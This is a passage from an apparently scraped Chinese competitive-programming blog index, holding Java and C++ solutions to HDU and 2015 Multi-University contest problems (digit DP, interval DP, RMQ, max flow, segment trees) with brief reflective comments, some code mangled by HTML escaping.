static int maxm=4600;static int fun(int n){ int res=0,tmp=1; while(n&gt;0){ res+=n%10*tmp; tmp&amp;lt;&amp;lt;=1; n/=10; } return res;}static void init(){ int tmp=1; f=new int[10][maxm+1]; f[0][0]=1; for(int i=1;i&lt;10;i++){ for(int j=0;j&amp;lt;=maxm;j++) for(int k=0;k&amp;lt;=9;k++) if (j+tmp*k&amp;lt;=maxm) f[i][j+tmp*k]+=f[i-1][j]; tmp&amp;lt;&amp;lt;=1; } for(int i=0;i&lt;10;i++) for(int j=1;j&amp;lt;=maxm;j++) f[i][j]+=f[i][j-1]; }static int[] getdg(int n){ int[] res=new int[10]; while(n&gt;0){ res[++res[0]]=n%10; n/=10; } return res;}public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); init(); int T=in.nextInt(),cas=0; while(T–&gt;0){ int A=in.nextInt(); int B=in.nextInt(); int m=fun(A); digit=getdg(B); int ans=0,tmp=1&amp;lt;&amp;lt;digit[0]; for(int i=digit[0];i&amp;gt;=1;i--){ tmp&amp;gt;&amp;gt;=1; for(int k=0;k&amp;lt;digit[i];k++){ if (m-k*tmp&amp;gt;=0){ ans+=f[i-1][m-k*tmp]; } } m-=digit[i]*tmp; if (m&amp;lt;0) break; } if (m&amp;gt;=0) ans++; out.println(&amp;quot;Case #&amp;quot;+(++cas)+&amp;quot;: &amp;quot;+ans); } out.flush(); out.close();} }[/code]磕磕绊绊的，到底有几大难？期初是有过转化为背包问题的尝试，但是忽视了数位DP的处理手段；可先扩大枚举范围，再从中筛选。预处理的两套循环不能杂糅在一起，因为先通过递推求了第i位、限制F(x)==j的解，然后才相加得到第i位、限制F(x)≤j的解。筛选时注意“小于”的枚举方式。最后还应留意B为可行解的条件。 1010 A Bit Fun[code lang=”java”]/** Aug 22, 2015 4:28:18 PM PrjName:hdu4737 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args*/static int[] a;static Queue&lt;Integer&gt; que=new LinkedList&lt;Integer&gt;();public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(),cas=0; while(T–&gt;0){int n=in.nextInt(); int m=in.nextInt(); a=new int[n+1]; que.clear(); int ans=0; for(int i=1;i&amp;lt;=n;i++){ a[i]=in.nextInt(); int k=que.size(); for(int j=0;j&amp;lt;k;j++){ int tmp=que.poll()|a[i]; if (tmp&amp;lt;m) que.add(tmp); } if (a[i]&amp;lt;m) que.add(a[i]); ans+=que.size(); } out.println(&amp;quot;Case #&amp;quot;+(++cas)+&amp;quot;: &amp;quot;+ans); } out.flush(); out.close();} }[/code]并没有实现有些题解中所说的O(nlogn)或O(30n)的算法，但总的运行时间还是较短的？","link":"/posts/d68c0ceb/"},{"title":"hdu 5115 Dire Wolf 区间DP","text":"2014ACM/ICPC亚洲区北京站Dire Wolf[code lang=”java”]/** 2015年7月18日 上午9:55:52 PrjName:hdu5115 @ Semprathlon/import java.io.;public class Main { final static long inf=0x7FFFFFFFFFFFFFFFL; static long min(long a,long b){return Math.min(a, b); } public static void main(String[] args) throws IOException{// TODO Auto-generated method stub StreamTokenizer in=new StreamTokenizer(new BufferedReader(new InputStreamReader(System.in))); PrintWriter out=new PrintWriter(new OutputStreamWriter(System.out)); in.nextToken(); int T=(int)in.nval,cas=0; int[] a,b; long[][] f; while(T--&amp;gt;0){ in.nextToken(); int n=(int)in.nval; a=new int[n+2]; b=new int[n+2]; f=new long[n+2][n+2]; for(int i=1;i&amp;lt;=n;i++){ in.nextToken(); a[i]=(int)in.nval; } for(int i=1;i&amp;lt;=n;i++){ in.nextToken(); b[i]=(int)in.nval; } f[1][1]=a[1]+b[2]; f[n][n]=a[n]+b[n-1]; for(int i=2;i&amp;lt;n;i++) f[i][i]=a[i]+b[i-1]+b[i+1]; for(int i=1;i&amp;lt;=n;i++) for(int j=i+1;j&amp;lt;=n;j++) f[i][j]=inf; for(int j=0;j&amp;lt;=n;j++) for(int i=1;i+j&amp;lt;n+1;i++) for(int k=i;k&amp;lt;=i+j;k++){ f[i][i+j]=min(f[i][i+j],f[i][k-1]+f[k+1][i+j]+a[k]+b[i-1]+b[i+j+1]); //out.print(f[i][i+j]+&amp;quot; &amp;quot;); } /*for(int i=0;i&amp;lt;=n+1;i++){out.println(); for(int j=0;j&amp;lt;=n+1;j++) out.print(f[i][j]+&amp;quot;\\t&amp;quot;); }*/ /*for(int i=0;i&amp;lt;n;i++) for(int j=1;j&amp;lt;n-i;j++){ if (j==1) min(f[j][j+i],f[j+1][j+i]+a[j]); if (j&amp;gt;1) min(f[j][j+i],f[j+1][j+i]+a[j]+b[j-1]); if (i+j&amp;lt;n) min(f[j][j+i],f[j][j+i-1]+a[j+i]+b[j+i+1]); if (i+j==n) min(f[j][j+i],f[j][j+i-1]+a[j+i]); for(int k=j+1;k&amp;lt;j+i;k++) min(f[j][j+i],f[j][k-1]+a[k]+f[k+1][j+i]); }*/ out.println(&amp;quot;Case #&amp;quot;+(++cas)+&amp;quot;: &amp;quot;+f[1][n]); out.flush(); } out.close(); } }[/code]贪心真的是要贪婪死了。。。已消除区段。。。其实对后续操作没有影响，符合无后效性。","link":"/posts/24de410e/"},{"title":"Bestcoder","text":"Protest一时爽，final test全爆零 QwQ 1001 wyh2000 and a string problem[code lang=”java”]out.println(str.matches(&quot;.w.y.h.&quot;)||str.matches(&quot;.v{2,}.y.h.&quot;)?&quot;Yes&quot;:&quot;No&quot;);[/code]偷懒着用正则表达式，华丽地TLE……后来就醉了一样的胡乱的写了个匹配也不太行……[code lang=”java”]import java.io.;import java.util.;import java.math.;import java.util.regex.;import com.sun.org.apache.xalan.internal.xsltc.compiler.Pattern;public class Main { static boolean check(String str){ int res=0; int i,len=str.length(); for(i=0;i&lt;len-1;i++) if (str.charAt(i)==’w’||str.charAt(i)==’v’&amp;&amp;str.charAt(i+1)==’v’){ res|=1;break; } for(;i&lt;len;i++) if (str.charAt(i)==’y’){ res|=2;break; } for(;i&lt;len;i++) if (str.charAt(i)==’h’){ res|=4;break; } return res==7; } public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub InputReader in = new InputReader(System.in) ; PrintWriter out = new PrintWriter(System.out) ; int T=in.nextInt(); while(T–&gt;0){ String str=in.next(); out.println(check(str)?&quot;Yes&quot;:&quot;No&quot;); out.flush(); } out.close(); }}[/code] 1002 wyh2000 and pupil[code lang=”cpp”] #include&lt;cctype&gt; #include&lt;cmath&gt; #include&lt;cstdio&gt; #include&lt;cstring&gt; #include&lt;algorithm&gt; #include&lt;iostream&gt; #include&lt;string&gt; #include&lt;queue&gt; #include&lt;stack&gt; #include&lt;set&gt; #include&lt;map&gt; using namespace std; typedef long long LL;typedef unsigned long long ULL;const int maxn=200010;const int inf=0x7fffffff;const double eps=1e-3; short col[maxn];int s[2]; struct Edge{ int to,next; Edge(){} Edge(int v,int w):to(v),next(w){}} edge[maxn];int head[maxn]; void addedge(int u,int v){ edge[head[0]]=Edge(v,head[u]); head[u]=head[0]++;} void init(){ fill(head,head+maxn,-1); head[0]=1;} int bfs(int u){ queue&lt;int&gt; q; q.push(u); col[u]=0; while(!q.empty()) { int p=q.front(); s[col[p]]++; q.pop(); for(int i=head[p];i!=-1;i=edge[i].next) { int v=edge[i].to; if (col[v]&gt;=0) { if (col[v]==col[p]) return -1; } else { col[v]=1^col[p]; q.push(v); } } } return 0; } int main(){ int T; scanf(&quot;%d&quot;,&amp;T); while(T–) { init(); int n,m; scanf(&quot;%d%d&quot;,&amp;n,&amp;m); for(int i=1;i&lt;=m;i++) { int u,v; scanf(&quot;%d%d&quot;,&amp;u,&amp;v); addedge(u,v); addedge(v,u); } int sum=0; fill(col+1,col+n+1,-1); for(int i=1;i&amp;lt;=n;i++) if (col[i]&amp;lt;0) { s[0]=s[1]=0; if (bfs(i)&amp;lt;0) { sum=-1;break; } else sum+=max(s[0],s[1]); } if (n==sum) sum--; if (sum&amp;lt;1||n-sum&amp;lt;1) puts(&amp;quot;Poor wyh&amp;quot;); else printf(&amp;quot;%d %d\\n&amp;quot;,sum,n-sum); } return 0; }[/code]事实证明这并不是二分图匹配；并没有什么典型的算法让两个集合中的一个最大……用DFS或BFS都可实现填色。","link":"/posts/97dd1257/"},{"title":"2015 Multi-University Training Contest 1","text":"1002 Assignment RMQ[code lang=”java”]/** 2015年7月21日 下午1:40:29 PrjName:0721-02 @ Semprathlon/import java.io.;import java.util.*;public class Main { final static int maxm=20,maxn=100010; static int[] a; static int[][] maxsum,minsum; static int n,k; static void RMQ(){ //预处理-&gt;O(nlogn){ for(int i = 1; i != maxm; ++i) for(int j = 1; j &amp;lt;= n; ++j) if(j + (1 &amp;lt;&amp;lt; i) - 1 &amp;lt;= n){ maxsum[i][j] = Math.max(maxsum[i - 1][j], maxsum[i - 1][j + (1 &amp;lt;&amp;lt; i &amp;gt;&amp;gt; 1)]); minsum[i][j] = Math.min(minsum[i - 1][j], minsum[i - 1][j + (1 &amp;lt;&amp;lt; i &amp;gt;&amp;gt; 1)]); } } static int query(int src,int des){ int k = (int)(Math.log(des - src + 1.0) / Math.log(2.0)); int maxres = Math.max(maxsum[k][src], maxsum[k][des - (1 &amp;lt;&amp;lt; k) + 1]); int minres = Math.min(minsum[k][src], minsum[k][des - (1 &amp;lt;&amp;lt; k) + 1]); return maxres-minres; } static int bisearch(int p){ int l=p,r=n; int res=p; while(l&amp;lt;=r){ int mid=(l+r)&amp;gt;&amp;gt;1; int dif=query(p,mid); if (dif&amp;lt;k){ res=mid;l=mid+1; } else r=mid-1; } return res-p+1; } public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T--&amp;gt;0){ n=in.nextInt(); k=in.nextInt(); a=new int[n+1]; maxsum=new int[maxm][n+1]; minsum=new int[maxm][n+1]; for(int i=1;i&amp;lt;=n;i++){ a[i]=in.nextInt(); maxsum[0][i]=minsum[0][i]=a[i]; } RMQ(); long res=0L; for(int i=1;i&amp;lt;=n;i++) //out.print(bisearch(i)+&amp;quot; &amp;quot;); res+=bisearch(i); out.println(res); } out.flush(); out.close(); } } class InputReader{ public BufferedReader reader; public StringTokenizer tokenizer; public InputReader(InputStream stream){ reader = new BufferedReader(new InputStreamReader(stream), 32768); tokenizer = null; } public String next(){ while(tokenizer == null || !tokenizer.hasMoreTokens()){ try{ tokenizer = new StringTokenizer(reader.readLine()); }catch (IOException e) { throw new RuntimeException(e); } } return tokenizer.nextToken(); } public int nextInt() { return Integer.parseInt(next()); } public long nextLong() { return Long.parseLong(next()); } }[/code] 1007 Tricks Devicenetflow,maxflow,Dinic[code lang=”java”]/** 2015年7月22日 上午10:07:44 PrjName:0721-07 @ Semprathlon/import java.io.;import java.util.*; class Edge{ int to,cap,rev,next; Edge(){} Edge(int t,int w,int r,int nt){ to=t;cap=w;rev=r;next=nt; } Edge(Edge e){ this.to=e.to; this.cap=e.cap; this.rev=e.rev; this.next=e.next; } void set(int t,int w,int r,int nt){ to=t;cap=w;rev=r;next=nt; } void set(Edge e){ this.to=e.to; this.cap=e.cap; this.rev=e.rev; this.next=e.next; }}class Queue&lt;T&gt;{ T[] data; int size,h,r; /Queue(Class&lt;T&gt; c,int sz){ size=sz; @SuppressWarnings(&quot;unchecked&quot;) final T[] tmp=(T[])Array.newInstance(c, sz); data=tmp; }/ Queue(int sz){ size=sz; data=(T[])new Object[sz]; } void clear(){ h=r=0; } boolean empty(){ return h==r; } boolean full(){ return (r+1)%size==h; } void push(T n){ data[r]=n; r=(r+1)%size; } T pop(){ T tmp=data[h]; h=(h+1)%size; return tmp; }} public class Main { static int[] head,dis,cnt; static boolean[] vis; static Edge[] G; static int n,m; static Queue&lt;Integer&gt; que; static void bfs(int st){ Arrays.fill(dis, -1); que.clear(); dis[st]=0; vis[st]=true; que.push(st); while(!que.empty()){ int u=que.pop(); for(int i=head[u];i&gt;-1;i=G[i].next){ int v=G[i].to; if (G[i].cap&gt;0&amp;&amp;!vis[v]){ dis[v]=dis[u]+1; que.push(v); vis[v]=true; } } } } static int dfs(int u,int d){ if (u==n) return d; int res=0; for(int i=head[u];i&gt;-1;i=G[i].next){ int v=G[i].to; if (G[i].cap&gt;0&amp;&amp;dis[v]==dis[u]+1){ int tmp=dfs(v,Math.min(d,G[i].cap)); G[i].cap-=tmp; G[G[i].rev].cap+=tmp; d-=tmp; res+=tmp; } } return res; } static int max_flow(int s,int t){ int res=0; for(;;){ Arrays.fill(vis, false); bfs(s); if (!vis[t]) return res; res+=dfs(s,Integer.MAX_VALUE); } } static void addedge(int from,int to,int cap){ G[head[0]]=new Edge(to, cap, head[0]+1, head[from]); head[from]=head[0]++; G[head[0]]=new Edge(from,cap,head[0]-1,head[to]); head[to]=head[0]++; } static void spfa(int st){ que.clear(); que.push(st); dis[st]=0; vis[st]=true; while(!que.empty()){ int u=que.pop();vis[u]=false; for(int i=head[u];i&gt;-1;i=G[i].next){ int v=G[i].to; if (dis[u]+G[i].cap&lt;dis[v]){ dis[v]=dis[u]+G[i].cap; if (!vis[v]){ que.push(v); vis[v]=true; } } } } } static int spfa2(int s,int t){ Arrays.fill(cnt, Integer.MAX_VALUE); Arrays.fill(vis, false); que.clear(); que.push(s); cnt[s]=0; vis[s]=true; while(!que.empty()){ int u=que.pop();vis[u]=false; for(int i=head[u];i&gt;-1;i=G[i].next){ int v=G[i].to; if (dis[u]+G[i].cap!=dis[v]) continue; if (!vis[v]){ que.push(v); vis[v]=true; } cnt[v]=Math.min(cnt[v], cnt[u]+1); } } return cnt[t]; } static void init(){ G=new Edge[(m&amp;lt;&amp;lt;1)+1]; head=new int[(m&amp;lt;&amp;lt;1)+1]; dis=new int[n+1]; cnt=new int[n+1]; vis=new boolean[n+1]; Arrays.fill(head, -1); Arrays.fill(dis, Integer.MAX_VALUE); head[0]=1; //que=new Queue(Integer.class,(m&amp;lt;&amp;lt;1)+1); que=new Queue&amp;lt;Integer&amp;gt;((m&amp;lt;&amp;lt;1)+1); } public static void main(String[] args) throws IOException,InterruptedException { // TODO Auto-generated method stub StreamTokenizer cin = new StreamTokenizer(new BufferedInputStream(System.in)); //InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); while(cin.nextToken()!=StreamTokenizer.TT_EOF){ n=(int)cin.nval; cin.nextToken(); m=(int)cin.nval; init(); for(int i=1;i&amp;lt;=m;i++){ cin.nextToken(); int u=(int)cin.nval; cin.nextToken(); int v=(int)cin.nval; cin.nextToken(); int w=(int)cin.nval; addedge(u, v, w); //addedge(v, u, w); } spfa(1); //out.println(dis[n]); //max_flow(1, n); //init2(); Dinic dinic=new Dinic(1, n); for(int u=1;u&amp;lt;=n;u++) for(int i=head[u];i&amp;gt;-1;i=G[i].next){ int v=G[i].to; if (dis[u]+G[i].cap==dis[v]) dinic.add(u, v, 1); } /*init(); for(int i=1;i&amp;lt;=U[0];i++) addedge(U[i],V[i].to,1);*/ out.println(dinic.maxflow()+&amp;quot; &amp;quot;+(m-spfa2(1,n))); /*for(int i=1;i&amp;lt;=n;i++) for(int j=head[i];j&amp;gt;-1;j=G[j].next) out.println(j+&amp;quot;\\t:&amp;quot;+i+&amp;quot; &amp;quot;+G[j].to+&amp;quot; &amp;quot;+G[j].cap+&amp;quot; &amp;quot;+G[j].rev+&amp;quot; &amp;quot;+G[j].next);*/ } out.flush(); out.close(); } } class Dinic{ public Dinic(int sourse , int meet){ this.sourse = sourse ; this.meet = meet ; Arrays.fill(g, 0) ; id = 1 ; } static final int maxn = 2008 , maxm = 500000 ; static class Edge{ int v , f ,next ; Edge(){} Edge(int _v , int _f , int _next){ this.v = _v ; this.f = _f ; this.next = _next ; } }; int sourse , meet ; int id ; static Edge[] e = new Edge[maxm*2 + 10] ; static int[] g = new int[maxn + 10] ; public void add(int u , int v , int f){ e[++id] = new Edge(v , f ,g[u]) ; g[u] = id ; e[++id] = new Edge(u , 0 , g[v]) ; g[v] = id ; } Queue&amp;lt;Integer&amp;gt; que = new Queue&amp;lt;Integer&amp;gt;(maxm); static boolean[] vis = new boolean[maxn + 10] ; static int[] dist = new int[maxn + 10] ; void bfs(){ Arrays.fill(dist, 0) ; while(! que.empty()) que.pop() ; que.push(sourse) ; vis[sourse] = true ; while(! que.empty()){ int u = que.pop() ; for(int i = g[u] ; i &amp;gt; 0 ; i = e[i].next){ int v = e[i].v ; if(e[i].f &amp;gt; 0 &amp;amp;&amp;amp; !vis[v]){ que.push(v) ; dist[v] = dist[u] + 1 ; vis[v] = true ; } } } } int dfs(int u , int delta){ if(u == meet) return delta ; int ans = 0 ; for(int i = g[u] ; i &amp;gt; 0 &amp;amp;&amp;amp; delta &amp;gt; 0 ; i = e[i].next){ int v = e[i].v ; if(e[i].f &amp;gt; 0 &amp;amp;&amp;amp; dist[v] == dist[u] + 1){ int d = dfs(v , Math.min(delta , e[i].f)) ; e[i].f -= d ; e[i^1].f += d ; delta -= d ; ans += d ; } } return ans ; } public int maxflow(){ int ans = 0 ; while(true){ Arrays.fill(vis, false) ; bfs() ; if(! vis[meet]) return ans ; ans += dfs(sourse , Integer.MAX_VALUE) ; } } } class InputReader{ public BufferedReader reader; public StringTokenizer tokenizer; public InputReader(InputStream stream){ reader = new BufferedReader(new InputStreamReader(stream), 32768); tokenizer = null; } public String next(){ while(tokenizer == null || !tokenizer.hasMoreTokens()){ try{ tokenizer = new StringTokenizer(reader.readLine()); }catch (IOException e) { throw new RuntimeException(e); } } return tokenizer.nextToken(); } public int nextInt() { return Integer.parseInt(next()); } public long nextLong() { return Long.parseLong(next()); } }[/code]特别复杂的套模板","link":"/posts/80d7931b/"},{"title":"2015 Multi-University Training Contest 2","text":"1002 Buildings特别拐弯抹角的平面几何模拟计算[code lang=”cpp”] #include&lt;cctype&gt; #include&lt;cmath&gt; #include&lt;cstdio&gt; #include&lt;cstring&gt; #include&lt;algorithm&gt; #include&lt;iostream&gt; #include&lt;string&gt; #include&lt;queue&gt; #include&lt;stack&gt; #include&lt;set&gt; #include&lt;map&gt; using namespace std; typedef long long LL;typedef unsigned long long ULL;const int maxn=210;const int inf=0x7fffffff;const double eps=1e-3; int N,M; int main(){ int x,y; while(~scanf(&quot;%d%d%d%d&quot;,&amp;N,&amp;M,&amp;x,&amp;y)) { if (M&lt;N) { swap(N,M); swap(x,y); } int t0=(N+1)&gt;&gt;1; int up=x-1; int down=N-x; int left=y-1; int right=M-y; //cout&lt;&lt;t0&lt;&lt;endl; if ((N&amp;1)&amp;&amp;N==M&amp;&amp;x==y&amp;&amp;x==(N+1)/2) printf(&quot;%d\\n&quot;,t0-1); /else if (min(up,down)&gt;t0) printf(&quot;%d\\n&quot;,min(max(left,right),min(up,down)));/ else { x=min(x,N-x+1); y=min(y,M-y+1); t0=max(t0,min(N-x,y)); t0=min(t0,(M+1)/2); printf(&quot;%d\\n&quot;,t0); } } return 0; }[/code]","link":"/posts/19dec2a1/"},{"title":"hdu 3853 LOOPS 递推求期望","text":"hdu 3853 LOOPS计算期望，往往是从末状态到初状态倒推的，相见恨晚[code lang=”cpp”] #include&lt;stdio.h&gt; #include&lt;iostream&gt; #include&lt;algorithm&gt; #include&lt;string.h&gt; #include&lt;math.h&gt;using namespace std;const int MAXN=1010;const double eps=1e-5;double dp[MAXN][MAXN];double p1[MAXN][MAXN];double p2[MAXN][MAXN];double p3[MAXN][MAXN]; int main(){ int R,C; while(scanf(&quot;%d%d&quot;,&amp;R,&amp;C)!=EOF) { for(int i=1;i&lt;=R;i++) for(int j=1;j&lt;=C;j++) scanf(&quot;%lf%lf%lf&quot;,&amp;p1[i][j],&amp;p2[i][j],&amp;p3[i][j]); dp[R][C]=0; for(int i=R;i&gt;=1;i–) for(int j=C;j&gt;=1;j–) { if(i==R&amp;&amp;j==C)continue; if(fabs(1-p1[i][j])&lt;eps)continue; dp[i][j]=p2[i][j]/(1-p1[i][j])dp[i][j+1]+p3[i][j]/(1-p1[i][j])dp[i+1][j]+2/(1-p1[i][j]); } printf(&quot;%.3lf\\n&quot;,dp[1][1]); } return 0;}[/code]","link":"/posts/8b198553/"},{"title":"2015 Multi-University Training Contest 3","text":"1001 Magician具有肉眼可见的可用线段树解决的统计操作要求。但是区间更新异常繁杂。不要拘泥于区间内具体的数据选取，而应该采用状态转移。除了向上传递操作以外，注意查询操作时不要把区段查询结果直接更新到左右子树上（覆盖区域并不一致）[code lang=”java”]/** 2015年7月29日 上午10:35:39 PrjName:hdu5316-2 @ Semprathlon/import java.io.;import java.util.*; public class Main { final static long inf=0x4000000000000000L; final static int maxn=100010; static int[] a=new int[maxn+1]; static SegTree tr=new SegTree(1, maxn); public static void main(String[] args) { // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T–&gt;0){ int n=in.nextInt(); int m=in.nextInt(); for(int i=1;i&lt;=n;i++) a[i]=in.nextInt(); tr.reset(1,1, n, a); for(int i=1;i&lt;=m;i++){ int k=in.nextInt(); int x=in.nextInt(); if (k==0){ //out.println(tr.query(x, y)); int y=in.nextInt(); long ans=-inf; long[] res=tr.query(1,x, y); for(int j=0;j&lt;4;j++) ans=Math.max(ans, res[j]); out.println(ans); } else{ long y=in.nextLong(); tr.update(1,x, y); } } } out.flush(); out.close(); } } class SegTree{ final static long inf=0x4000000000000000L; int[] l,r,mid; long[][] s; SegTree(int x,int y){ l=new int[(y-x+2)&lt;&lt;2]; r=new int[(y-x+2)&lt;&lt;2]; mid=new int[(y-x+2)&lt;&lt;2]; s=new long[(y-x+2)&lt;&lt;2][4]; build(1,x,y); } void build(int k,int x,int y){ /l=x;r=y;/mid[k]=(x+y)&gt;&gt;1; if (x&lt;y){ build(k&lt;&lt;1,x, mid[k]); build(k&lt;&lt;1|1,mid[k]+1, y); } //s0=s1=s2=s3=-inf; } void reset(int k,int x,int y,int[] a){ l[k]=x;r[k]=y;mid[k]=(x+y)&gt;&gt;1; if (x&lt;y){ reset(k&lt;&lt;1,x, mid[k], a); reset(k&lt;&lt;1|1,mid[k]+1, y, a); up(s[k],s[k&lt;&lt;1],s[k&lt;&lt;1|1]); } else{ if ((mid[k]&amp;1)&gt;0){//odd s[k][0]=a[mid[k]]; s[k][1]=s[k][2]=s[k][3]=-inf; } else{//even s[k][3]=a[mid[k]]; s[k][0]=s[k][1]=s[k][2]=-inf; } } } void up(long[] k,long[] l,long[] r){ k[0]=k[1]=k[2]=k[3]=-inf; k[0]=Math.max(k[0], l[0]+r[2]);//odd-odd k[0]=Math.max(k[0], l[1]+r[0]); k[1]=Math.max(k[1], l[1]+r[1]);//odd-even k[1]=Math.max(k[1], l[0]+r[3]); k[2]=Math.max(k[2], l[2]+r[2]);//even-odd k[2]=Math.max(k[2], l[3]+r[0]); k[3]=Math.max(k[3], l[3]+r[1]);//even-even k[3]=Math.max(k[3], l[2]+r[3]); k[0]=Math.max(k[0], l[0]); k[0]=Math.max(k[0], r[0]); k[1]=Math.max(k[1], l[1]); k[1]=Math.max(k[1], r[1]); k[2]=Math.max(k[2], l[2]); k[2]=Math.max(k[2], r[2]); k[3]=Math.max(k[3], l[3]); k[3]=Math.max(k[3], r[3]); } long[] query(int k,int x,int y){ long[] res=new long[4]; if (x==l[k]&amp;amp;&amp;amp;r[k]==y){ res=s[k].clone(); } else{ long[] L,R; if (x&amp;lt;=mid[k]) L=query(k&amp;lt;&amp;lt;1,x,Math.min(y, mid[k])).clone(); else L=new long[]{-inf,-inf,-inf,-inf}; if (mid[k]&amp;lt;y) R=query(k&amp;lt;&amp;lt;1|1,Math.max(mid[k]+1, x),y).clone(); else R=new long[]{-inf,-inf,-inf,-inf}; up(res,L,R); } return res; } void update(int k,int x,long d){ if (l[k]==r[k]){ if ((mid[k]&amp;amp;1)&amp;gt;0){//odd s[k][0]=d; s[k][1]=s[k][2]=s[k][3]=-inf; } else{//even s[k][3]=d; s[k][0]=s[k][1]=s[k][2]=-inf; } return; } if (x&amp;lt;=mid[k]) update(k&amp;lt;&amp;lt;1,x,d); if (mid[k]&amp;lt;x) update(k&amp;lt;&amp;lt;1|1,x,d); up(s[k],s[k&amp;lt;&amp;lt;1],s[k&amp;lt;&amp;lt;1|1]); } } class InputReader{ public BufferedReader reader; public StringTokenizer tokenizer; public InputReader(InputStream stream){ reader = new BufferedReader(new InputStreamReader(stream), 32768); tokenizer = null; } public String next(){ while(tokenizer == null || !tokenizer.hasMoreTokens()){ try{ tokenizer = new StringTokenizer(reader.readLine()); }catch (IOException e) { throw new RuntimeException(e); } } return tokenizer.nextToken(); } public int nextInt() { return Integer.parseInt(next()); } public long nextLong() { return Long.parseLong(next()); } }[/code] 1010 Crazy Bobo","link":"/posts/6ed9f237/"},{"title":"2015 Multi-University Training Contest 4","text":"1009 Walk Out状态压缩方面，虽然想到了用一维的x+y替代二维的x,y，但并没有做到位。既然可以转化成二维DP，还有何搜索必要寻找合适的出发点时，不要陷入“极近点”而丢失了“最近点”！[code lang=”cpp”] #include&lt;cctype&gt; #include&lt;cstdio&gt; #include&lt;cstring&gt; #include&lt;algorithm&gt; #include&lt;iostream&gt; #include&lt;string&gt; #include&lt;queue&gt; #include&lt;stack&gt; #include&lt;set&gt; #include&lt;map&gt; #pragma comment(linker, &quot;/STACK:102400000,102400000&quot;)using namespace std;typedef long long LL;typedef unsigned long long ULL;const int inf=0x7fffffff;const double eps=1e-3; typedef pair&lt;int,int&gt; pr;const int dir[4][2]={ {0,-1},{0,1},{-1,0},{1,0}};const int maxn=1010;const int maxm=1010;int n,m,X0,Y0;bool g[maxn][maxm],f[maxn][maxm],vis[maxn][maxm];char str[maxn]; bool can(int x,int y){ if (x&lt;1||x&gt;n||y&lt;1||y&gt;m) return 0; return 1;}bool can(pr p){ return can(p.first,p.second);}int mdis(int x,int y){ return abs(x-n)+abs(y-m);}int mdis(pr p){ return mdis(p.first,p.second);}int geth(pr p){ return p.first+p.second;} void find0(int x,int y){ if (vis[x][y]||!can(x,y)) return; vis[x][y]=1; if (g[x][y]) return; f[x][y]=1; if (x+y&gt;X0+Y0) { X0=x;Y0=y; } for(int i=0;i&lt;4;i++) find0(x+dir[i][0],y+dir[i][1]);} int main(){ int T; scanf(&quot;%d&quot;,&amp;T); while(T–) { scanf(&amp;quot;%d%d&amp;quot;,&amp;amp;n,&amp;amp;m); for(int i=1;i&amp;lt;=n;i++) { scanf(&amp;quot;%s&amp;quot;,str+1); for(int j=1;j&amp;lt;=m;j++) { if (str[j]==&apos;1&apos;) g[i][j]=1; else g[i][j]=0; } } X0=0;Y0=0; memset(vis[0],0,maxn*maxm*sizeof(vis[0][0])); memset(f[0],0,maxn*maxm*sizeof(f[0][0])); find0(1,1); //cout&amp;lt;&amp;lt;X0&amp;lt;&amp;lt;&apos; &apos;&amp;lt;&amp;lt;Y0&amp;lt;&amp;lt;endl; if (X0+Y0==n+m){ printf(&amp;quot;%d\\n&amp;quot;,0); continue; } if (X0+Y0&amp;lt;2) { X0=1;Y0=1; f[1][1]=1; printf(&amp;quot;1&amp;quot;); } for(int i=X0+Y0;i&amp;lt;n+m;i++) { int k=1; for(int j=max(1,i-m);j&amp;lt;=min(n,i-1);j++) if (f[j][i-j]) { int k1=j&amp;lt;n?g[j+1][i-j]:1; int k2=i-j&amp;lt;m?g[j][i-j+1]:1; k=min(k,min(k1,k2)); } for(int j=max(1,i-m);j&amp;lt;=min(n,i-1);j++) if (f[j][i-j]) { int k1=j&amp;lt;n?g[j+1][i-j]:1; int k2=i-j&amp;lt;m?g[j][i-j+1]:1; if (k1==k) f[j+1][i-j]=1; if (k2==k) f[j][i-j+1]=1; } printf(&amp;quot;%d&amp;quot;,k); } puts(&amp;quot;&amp;quot;); } return 0; }[/code]","link":"/posts/f0bd6794/"},{"title":"2015 Multi-University Training Contest 5","text":"1009 MZL’s Border字符串是可递归形式构造的，求解也是递归的；但是递归时划分的三种情况，最终并没有做好化归[code lang=”java”]import java.io.;import java.util.;import java.math.*;public class Main{ static BigInteger f[] = new BigInteger[1005]; public static void main(String[] args){ f[1] = new BigInteger(&quot;1&quot;); f[2] = new BigInteger(&quot;2&quot;); for(int i = 3; i &lt;= 1001; i++) f[i] = f[i - 1].add(f[i - 2]); Scanner cin = new Scanner(System.in); int T = cin.nextInt(); int n; BigInteger m; for(int cas = 1; cas &lt;= T; cas++){ n = cin.nextInt(); m = cin.nextBigInteger(); BigInteger mm = m.add(new BigInteger(&quot;1&quot;)); int p = 0; for(int i = 1; i &lt;= 1001; i++){ if(f[i].compareTo(mm) &gt; 0){ p = i; break; } } BigInteger ans = m.subtract(f[p - 2]); System.out.println(ans.mod(new BigInteger(&quot;258280327&quot;))); } } }[/code]","link":"/posts/87ba5702/"},{"title":"hdu 4135 Co-prime 容斥原理","text":"hdu 4135具有教科书性质的容斥原理应用实例。能不重复、不遗漏地选出所有合数，也就能得到质数。[code lang=”java”]/** Aug 26, 2015 9:40:09 PM PrjName:hdu4135 @author Semprathlon/import java.io.;import java.util.*;public class Main { static int maxn=1001; static int[] pri,fstp; static Vector&lt;Integer&gt; vec=new Vector&lt;Integer&gt;(); static void get_prime(){pri=new int[maxn]; fstp=new int[maxn]; for(int i=2;i&amp;lt;maxn;i++){ if (fstp[i]==0){ pri[++pri[0]]=i; } for(int j=1;j&amp;lt;=pri[0]&amp;amp;&amp;amp;i*pri[j]&amp;lt;maxn;j++){ int k=i*pri[j]; fstp[k]=pri[j]; if (i%pri[j]==0) break; } } } static Vector&lt;Integer&gt; get_prime_factor(int n){Vector&amp;lt;Integer&amp;gt; res=new Vector&amp;lt;Integer&amp;gt;(); res.clear(); for(int 